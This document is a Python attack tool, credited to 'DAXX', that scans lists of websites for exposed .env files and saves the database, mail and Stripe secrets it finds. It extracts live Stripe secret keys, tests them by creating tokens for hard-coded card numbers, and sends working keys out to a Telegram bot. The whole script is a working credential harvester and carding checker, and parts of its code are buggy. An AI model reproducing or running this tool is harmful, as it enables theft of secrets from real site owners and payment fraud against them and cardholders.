import re
import sys
import os
import urllib3
import os.path
import random
import requests
from colorama import Fore, Back, Style, init 
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)
env = 0
sk = 0
C1 = 0
live=0
dead=0
checked = 0
numbers = [
    "4023470607106283",
    "4355460262657363",
    "4023470602125650",
    "5111010022465466",
    "4095950011560764"
]
cc = random.choice(numbers)
class xcol:
    LGREEN = '\033[38;2;129;199;116m'
    LRED = '\033[38;2;239;83;80m'
    RESET = '\u001B[0m'
    LBLUE = '\033[38;2;66;165;245m'
    GREY = '\033[38;2;158;158;158m'


class ENV:
    def scan(self, url):
        global env
        global sk
        global checked
        global live
        global dead
        global C1
        rr = ''
        proto = ''
        mch = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'sk_live', 'APP_ENV=']
        
        try:
            r = requests.get(f'http://{url}/.env', verify=False, timeout=10, allow_redirects=False)
            checked += 1
            if r.status_code == 200:
                resp = r.text
                if any(key in resp for key in mch):
                    rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : http://{url}'
                    with open(os.path.join('ENVS', f'{url}.txt'), 'w') as output:
                        output.write(f'{resp}\n')
                    env += 1
                    if "sk_live" in resp:
                        file_object = open('SK_ENV.TXT', 'a')
                        file_object.write(f'{url}\n')
                        file_object.close()
                    lin = resp.splitlines()
                    for x in lin:
                        if "sk_live" in x:
                            pattern = r'sk_live_[a-zA-Z0-9]+'
                            matches = re.findall(pattern, x)  # Use x instead of resp.text
                            pattern1 = r'pk_live_[a-zA-Z0-9]+'
                            matches1 = re.findall(pattern1, resp)
                            for match in matches:  # Iterate over the matches
                                # Extract the Stripe key from the match
                                stripe_key = match
                                sk +=1
                                file_object = open('Total_SK.TXT', 'a')
                                file_object.write(f'{stripe_key}\n')
                                file_object.close
                                url = 'https://api.stripe.com/v1/account'
                                username = stripe_key  # Use the extracted stripe_key as the username
                                password = ''
                                session = requests.Session()
                                session.auth = (username, password)
                                session.verify = False
                                response = session.get(url, data=data)
                                if '"charges_enabled": true,' in response.text:                                        
                                        url = 'https://api.stripe.com/v1/tokens'
                                        username = stripe_key  # Use the extracted stripe_key as the username
                                        password = ''
                                        data = {
                                            'card[number]': cc,
                                            'card[exp_month]': '04',
                                            'card[exp_year]': '2030',
                                            'card[cvc]': '011'
                                        }
                                        session = requests.Session()
                                        session.auth = (username, password)
                                        session.verify = False
                                        response = session.post(url, data=data)
                                        if 'id":' in response.text:
                                            live += 1
                                            file_object = open('SK_LIVE.TXT', 'a')
                                            file_object.write(f'{stripe_key}\n')
                                            file_object.close
                                        if 'Sending credit' in response.text:
                                                file_object = open('SK_LIVE.TXT', 'a')
                                                file_object.write(f'{stripe_key}\n')
                                                file_object.close
                                                req= requests.get(f'https://api.telegram.org/bot<bottoken>/sendMessage?chat_id=<chatid>&text=LIVE SK {stripe_key}')
                                                C1 += 1
                                else:
                                    file_object = open('SK_DEAD.TXT', 'a')
                                    file_object.write(f'{stripe_key}\n')
                                    file_object.close
                                    dead += 1
                                
                                
                else:
                    rr = 'RE'
            else:
                rr = 'RE'
        except:
            rr = 'RE'

        if 'RE' in rr:
            try:
                proto = 'https'
                r = requests.get(f'https://{url}/.env', verify=False, timeout=10, allow_redirects=False)
                
                if r.status_code == 200:
                    resp = r.text
                    if any(key in resp for key in mch):
                        rr = f'{xcol.LGREEN}[ENV]{xcol.RESET} : https://{url}'
                        with open(os.path.join('ENVS', f'{url}.txt'), 'w') as output:
                            output.write(f'{resp}\n')
                        env += 1
                        if "sk_live" in resp:
                            file_object = open('SK_ENV.TXT', 'a')
                            file_object.write(f'{url}\n')
                            file_object.close()
                        lin = resp.splitlines()
                        for x in lin:
                            if "sk_live" in x:
                                pattern = r'sk_live_[a-zA-Z0-9]+'
                                matches = re.findall(pattern, x)  # Use x instead of resp.text
                                pattern1 = r'pk_live_[a-zA-Z0-9]+'
                                matches1 = re.findall(pattern1, resp)
                                for match in matches:  # Iterate over the matches
                                    # Extract the Stripe key from the match
                                    stripe_key = match
                                    sk+=1
                                    file_object = open('Total_SK.TXT', 'a')
                                    file_object.write(f'{stripe_key}\n')
                                    file_object.close
                                    url = 'https://api.stripe.com/v1/account'
                                    username = stripe_key  # Use the extracted stripe_key as the username
                                    password = ''
                                    session = requests.Session()
                                    session.auth = (username, password)
                                    session.verify = False
                                    response = session.get(url, data=data)
                                    if '"charges_enabled": true,' in response.text:                                        
                                            url = 'https://api.stripe.com/v1/tokens'
                                            username = stripe_key  # Use the extracted stripe_key as the username
                                            password = ''
                                            data = {
                                                'card[number]': cc,
                                                'card[exp_month]': '04',
                                                'card[exp_year]': '2030',
                                                'card[cvc]': '011'
                                            }
                                            session = requests.Session()
                                            session.auth = (username, password)
                                            session.verify = False
                                            response = session.post(url, data=data)
                                            if 'id":' in response.text:
                                                live += 1
                                                file_object = open('SK_LIVE.TXT', 'a')
                                                file_object.write(f'{stripe_key}\n')
                                                file_object.close
                                            if 'Sending credit' in response.text:
                                                    file_object = open('SK_LIVE.TXT', 'a')
                                                    file_object.write(f'{stripe_key}\n')
                                                    file_object.close
                                                    req= requests.get(f'https://api.telegram.org/bot<bottoken>/sendMessage?chat_id=<chatid>&text=LIVE SK {stripe_key}')
                                                    C1 += 1
                                else:
                                    file_object = open('SK_DEAD.TXT', 'a')
                                    file_object.write(f'{stripe_key}\n')
                                    file_object.close
                                    dead += 1
                                
                    else:
                        rr = f'{xcol.LRED}[-] :{xcol.RESET} https://{url}'
                else:
                    rr = f'{xcol.LRED}[-] :{xcol.RESET} https://{url}'
            except:
                rr = f'{xcol.LRED}[*] :{xcol.RESET} https://{url}'

        # Print a progress bar-like output
        sys.stdout.write(f'\r{Fore.YELLOW}Total Checked= {checked}/{total_url}, {Fore.GREEN}Total env: {env}, {Fore.CYAN}Total sk: {sk}, {Fore.GREEN}Live sk: {live}, {Fore.YELLOW}Custom sk: {C1}, {Fore.RED}Dead sk: {dead} ')
        sys.stdout.flush()


if __name__ == '__main__':
    os.system('clear')
    print(Fore.MAGENTA+'''

     
░██████╗██╗░░██╗
██╔════╝██║░██╔╝
╚█████╗░█████═╝░
░╚═══██╗██╔═██╗░
██████╔╝██║░╚██╗
╚═════╝░╚═╝░░╚═╝

███████╗███╗░░██╗██╗░░░██╗
██╔════╝████╗░██║██║░░░██║
█████╗░░██╔██╗██║╚██╗░██╔╝
██╔══╝░░██║╚████║░╚████╔╝░
███████╗██║░╚███║░░╚██╔╝░░
╚══════╝╚═╝░░╚══╝░░░╚═╝░░░
: Coded by DAXX ''')

    if not os.path.isdir("ENVS"):
        os.makedirs("ENVS")

threads = []
while True:
    try:
        thrd = int(input(Fore.CYAN + "[THREAD] : " + Fore.RESET))
        break
    except:
        pass

while True:
    try:
        inpFile = input(Fore.CYAN + "[URLS PATH] : " + Fore.RESET)
        with open(inpFile) as urlList:
            argFile = urlList.read().splitlines()
            total_url = len(argFile)
        break
    except:
        pass

with ThreadPoolExecutor(max_workers=thrd) as executor:
    for data in argFile:
        threads.append(executor.submit(ENV().scan, data))
                                          
